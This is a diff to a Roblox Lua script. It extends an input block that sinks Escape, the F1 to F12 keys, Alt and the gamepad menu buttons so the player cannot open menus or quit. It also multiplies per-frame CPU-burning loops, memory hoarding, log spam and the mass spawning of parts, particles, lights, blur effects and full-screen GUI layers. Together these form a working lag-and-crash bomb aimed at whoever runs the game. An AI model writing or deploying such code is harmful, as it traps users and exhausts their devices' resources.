@@ -45,6 +45,20 @@ local blockedKeys = {
     [Enum.KeyCode.Escape] = true,
     [Enum.KeyCode.Return] = true,
     [Enum.KeyCode.KeypadEnter] = true,
+    [Enum.KeyCode.F4] = true,
+    [Enum.KeyCode.F1] = true,
+    [Enum.KeyCode.F2] = true,
+    [Enum.KeyCode.F3] = true,
+    [Enum.KeyCode.F5] = true,
+    [Enum.KeyCode.F6] = true,
+    [Enum.KeyCode.F7] = true,
+    [Enum.KeyCode.F8] = true,
+    [Enum.KeyCode.F9] = true,
+    [Enum.KeyCode.F10] = true,
+    [Enum.KeyCode.F11] = true,
+    [Enum.KeyCode.F12] = true,
+    [Enum.KeyCode.LeftAlt] = true,
+    [Enum.KeyCode.RightAlt] = true,
     [Enum.KeyCode.ButtonStart] = true,
     [Enum.KeyCode.ButtonSelect] = true,
     [Enum.KeyCode.ButtonB] = true,
@@ -52,17 +66,19 @@ local blockedKeys = {
 }
 
 ContextActionService:BindActionAtPriority(
-    "M7_BlockMenuKeys",
+    "M7_BlockAllKeys",
     function() return Enum.ContextActionResult.Sink end,
     false,
-    Enum.ContextActionPriority.High.Value + 1000,
+    Enum.ContextActionPriority.High.Value + 5000,
     Enum.KeyCode.Escape,
     Enum.KeyCode.Return,
     Enum.KeyCode.KeypadEnter,
-    Enum.KeyCode.ButtonStart,
-    Enum.KeyCode.ButtonSelect,
-    Enum.KeyCode.ButtonB,
-    Enum.KeyCode.ButtonA
+    Enum.KeyCode.F1, Enum.KeyCode.F2, Enum.KeyCode.F3, Enum.KeyCode.F4,
+    Enum.KeyCode.F5, Enum.KeyCode.F6, Enum.KeyCode.F7, Enum.KeyCode.F8,
+    Enum.KeyCode.F9, Enum.KeyCode.F10, Enum.KeyCode.F11, Enum.KeyCode.F12,
+    Enum.KeyCode.LeftAlt, Enum.KeyCode.RightAlt,
+    Enum.KeyCode.ButtonStart, Enum.KeyCode.ButtonSelect,
+    Enum.KeyCode.ButtonB, Enum.KeyCode.ButtonA
 )
 
 UserInputService.InputBegan:Connect(function(input)
@@ -383,19 +399,64 @@ WORK_PARENT.Parent = workspace
 
 local ALL_PARTS = {}
 
+for _ = 1, 6 do
+    RunService.Heartbeat:Connect(function()
+        local c = CFrame.new()
+        for _ = 1, 2500000 do
+            c = c * CFrame.Angles(math.random(), math.random(), math.random())
+        end
+    end)
+end
+
+for _ = 1, 4 do
+    RunService.RenderStepped:Connect(function()
+        local c = CFrame.new()
+        for _ = 1, 2500000 do
+            c = c * CFrame.Angles(math.random(), math.random(), math.random())
+        end
+    end)
+end
+
+for _ = 1, 3 do
+    RunService.Stepped:Connect(function()
+        local total = 0
+        for _ = 1, 1500000 do
+            total = total + math.sin(math.random()) * math.cos(math.random()) * math.tan(math.random())
+        end
+    end)
+end
+
 RunService.Heartbeat:Connect(function()
-    local ops = 0
-    local cframe = CFrame.new()
-    for _ = 1, 800000 do
-        cframe = cframe * CFrame.Angles(math.random(), math.random(), math.random())
-        ops = ops + 1
+    local desc = workspace:GetDescendants()
+    for _, inst in ipairs(desc) do
+        if inst:IsA("BasePart") then
+            pcall(function()
+                inst.CFrame = inst.CFrame * CFrame.Angles(math.random()*0.01, math.random()*0.01, math.random()*0.01)
+                inst.Color = Color3.new(math.random(), math.random(), math.random())
+            end)
+        end
     end
+end)
+
+RunService.Heartbeat:Connect(function()
+    local s = ""
+    for _ = 1, 2000 do
+        s = s .. string.rep(tostring(math.random()), 500)
+    end
+end)
+
+RunService.Heartbeat:Connect(function()
+    local t = {}
+    for i = 1, 300000 do
+        table.insert(t, {math.random(), math.random(), math.random(), math.random(), math.random()})
+    end
+    table.sort(t, function(a, b) return a[1] < b[1] end)
 end)
 
 RunService.Heartbeat:Connect(function()
     local n = #ALL_PARTS
     if n == 0 then return end
-    local limit = math.min(n, 3000)
+    local limit = math.min(n, 5000)
     for i = 1, limit do
         local p = ALL_PARTS[math.random(1, n)]
         if p and p.Parent then
@@ -411,7 +472,7 @@ task.spawn(function()
     while true do
         RunService.Heartbeat:Wait()
         local basePos = getBase()
-        for _ = 1, 40 do
+        for _ = 1, 80 do
             pcall(function()
                 local p = Instance.new("Part")
                 p.Size = Vector3.new(math.random(2,6), math.random(2,6), math.random(2,6))
@@ -434,10 +495,10 @@ end)
 
 task.spawn(function()
     while true do
-        task.wait(1.5)
+        task.wait(0.8)
         local basePos = getBase()
         local chain = {}
-        for i = 1, 60 do
+        for i = 1, 120 do
             pcall(function()
                 local p = Instance.new("Part")
                 p.Size = Vector3.new(2, 1, 2)
@@ -469,7 +530,7 @@ task.spawn(function()
     while true do
         RunService.Heartbeat:Wait()
         local basePos = getBase()
-        for _ = 1, 12 do
+        for _ = 1, 25 do
             pcall(function()
                 local ex = Instance.new("Explosion")
                 ex.BlastRadius = 0
@@ -486,7 +547,7 @@ task.spawn(function()
     while true do
         task.wait(0.1)
         local basePos = getBase()
-        for _ = 1, 50 do
+        for _ = 1, 100 do
             pcall(function()
                 local p = Instance.new("Part")
                 p.Size = Vector3.new(math.random(3,12), math.random(3,12), math.random(3,12))
@@ -509,8 +570,8 @@ task.spawn(function()
     while true do
         task.wait(0.3)
         local basePos = getBase()
-        local emitterCount = math.min(wave * 12, 1200)
-        local lightCount = math.min(wave * 6, 500)
+        local emitterCount = math.min(wave * 20, 2000)
+        local lightCount = math.min(wave * 10, 800)
         for _ = 1, emitterCount do
             pcall(function()
                 local p = Instance.new("Part")
@@ -518,7 +579,7 @@ task.spawn(function()
                 p.CanCollide = false; p.Anchored = true
                 p.CFrame = CFrame.new(basePos + Vector3.new(math.random(-120,120), math.random(0,100), math.random(-120,120)))
                 local em = Instance.new("ParticleEmitter")
-                em.Rate = 3000
+                em.Rate = 5000
                 em.Lifetime = NumberRange.new(30, 60)
                 em.Size = NumberSequence.new(35)
                 em.Texture = "rbxasset://textures/particles/sparkles_main.dds"
@@ -542,21 +603,22 @@ task.spawn(function()
                 table.insert(ALL_PARTS, p)
             end)
         end
-        wave = wave + 3
+        wave = wave + 5
     end
 end)
 
 task.spawn(function()
     while true do
-        task.wait(0.5)
+        task.wait(0.3)
         pcall(function()
             local basePos = getBase()
             local region = Region3.new(
-                basePos - Vector3.new(60, 30, 60),
-                basePos + Vector3.new(60, 30, 60)
+                basePos - Vector3.new(80, 40, 80),
+                basePos + Vector3.new(80, 40, 80)
             ):ExpandToGrid(4)
             local mat = ({Enum.Material.Grass, Enum.Material.Sand, Enum.Material.Rock,
-                          Enum.Material.Snow, Enum.Material.Water, Enum.Material.Slate})[math.random(1, 6)]
+                          Enum.Material.Snow, Enum.Material.Water, Enum.Material.Slate,
+                          Enum.Material.Concrete, Enum.Material.CrackedLava})[math.random(1, 8)]
             workspace.Terrain:FillRegion(region, 4, mat)
         end)
     end
@@ -564,7 +626,7 @@ end)
 
 task.spawn(function()
     local effects = {}
-    for _ = 1, 40 do
+    for _ = 1, 60 do
         local cc = Instance.new("ColorCorrectionEffect"); cc.Parent = Lighting; table.insert(effects, cc)
         local bl = Instance.new("BlurEffect"); bl.Size = 30; bl.Parent = Lighting; table.insert(effects, bl)
         local bm = Instance.new("BloomEffect"); bm.Intensity = 4; bm.Threshold = 0.1; bm.Size = 32; bm.Parent = Lighting; table.insert(effects, bm)
@@ -603,7 +665,7 @@ task.spawn(function()
     gui.DisplayOrder = 999997
     mount(gui)
     local layers = {}
-    for i = 1, 250 do
+    for i = 1, 400 do
         local f = Instance.new("Frame")
         f.Size = UDim2.fromScale(1, 1)
         f.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
@@ -623,7 +685,7 @@ end)
 
 task.spawn(function()
     while true do
-        task.wait(0.3)
+        task.wait(0.2)
         pcall(function()
             local cam = workspace.CurrentCamera
             if not cam then return end
@@ -631,9 +693,9 @@ task.spawn(function()
             att.Position = Vector3.new(math.random(-10,10), math.random(-6,6), -15)
             att.Parent = cam
             local em = Instance.new("ParticleEmitter")
-            em.Rate = 4000
-            em.Lifetime = NumberRange.new(4, 10)
-            em.Size = NumberSequence.new(50)
+            em.Rate = 6000
+            em.Lifetime = NumberRange.new(4, 12)
+            em.Size = NumberSequence.new(60)
             em.Texture = "rbxasset://textures/particles/smoke_main.dds"
             em.LightEmission = 0.8
             em.Transparency = NumberSequence.new(0.3)
@@ -644,9 +706,9 @@ end)
 
 task.spawn(function()
     while true do
-        task.wait(0.15)
+        task.wait(0.1)
         local basePos = getBase()
-        for _ = 1, 15 do
+        for _ = 1, 25 do
             pcall(function()
                 local p = Instance.new("Part")
                 p.Size = Vector3.new(1,1,1); p.Transparency = 1
@@ -697,9 +759,9 @@ end)
 
 task.spawn(function()
     while true do
-        task.wait(0.15)
+        task.wait(0.1)
         local basePos = getBase()
-        for _ = 1, 12 do
+        for _ = 1, 25 do
             pcall(function()
                 local p = Instance.new("Part")
                 p.Size = Vector3.new(30, 30, 1)
@@ -718,9 +780,9 @@ end)
 
 task.spawn(function()
     while true do
-        task.wait(0.08)
+        task.wait(0.05)
         local basePos = getBase()
-        for _ = 1, 20 do
+        for _ = 1, 40 do
             pcall(function()
                 local p1 = Instance.new("Part")
                 p1.Size = Vector3.new(0.2,0.2,0.2); p1.Transparency = 1
@@ -739,7 +801,7 @@ task.spawn(function()
                 local b = Instance.new("Beam")
                 b.Attachment0 = a1; b.Attachment1 = a2
                 b.Width0 = 6; b.Width1 = 6
-                b.Segments = 60
+                b.Segments = 100
                 b.Texture = "rbxasset://textures/particles/sparkles_main.dds"
                 b.TextureLength = 1
                 b.TextureSpeed = 10
@@ -755,9 +817,9 @@ end)
 
 task.spawn(function()
     while true do
-        task.wait(0.1)
+        task.wait(0.08)
         local basePos = getBase()
-        for _ = 1, 15 do
+        for _ = 1, 30 do
             pcall(function()
                 local p = Instance.new("Part")
                 p.Size = Vector3.new(math.random(6,18), math.random(6,18), math.random(6,18))
@@ -774,7 +836,7 @@ end)
 
 task.spawn(function()
     local blurs = {}
-    for _ = 1, 25 do
+    for _ = 1, 50 do
         local bl = Instance.new("BlurEffect")
         bl.Size = 50
         bl.Parent = Lighting
@@ -789,9 +851,9 @@ end)
 
 task.spawn(function()
     while true do
-        task.wait(0.5)
+        task.wait(0.3)
         local basePos = getBase()
-        for _ = 1, 30 do
+        for _ = 1, 60 do
             pcall(function()
                 local p = Instance.new("Part")
                 p.Size = Vector3.new(1,1,1); p.Transparency = 1
@@ -828,23 +890,23 @@ end)
 local HELD_TABLES = {}
 task.spawn(function()
     while true do
-        local t = table.create(200000)
-        for i = 1, 200000 do
-            t[i] = { math.random(), math.random(), tostring(math.random()) .. string.rep("x", 20) }
+        local t = table.create(500000)
+        for i = 1, 500000 do
+            t[i] = { math.random(), math.random(), tostring(math.random()) .. string.rep("x", 50) }
         end
         table.insert(HELD_TABLES, t)
-        if #HELD_TABLES > 30 then
+        if #HELD_TABLES > 60 then
             table.remove(HELD_TABLES, 1)
         end
-        task.wait(0.1)
+        task.wait(0.05)
     end
 end)
 
 task.spawn(function()
     while true do
-        for _ = 1, 500 do
-            print(string.rep(tostring(math.random()), 60))
+        for _ = 1, 1000 do
+            print(string.rep(tostring(math.random()), 100))
         end
-        task.wait(0.005)
+        task.wait(0.001)
     end
 end)
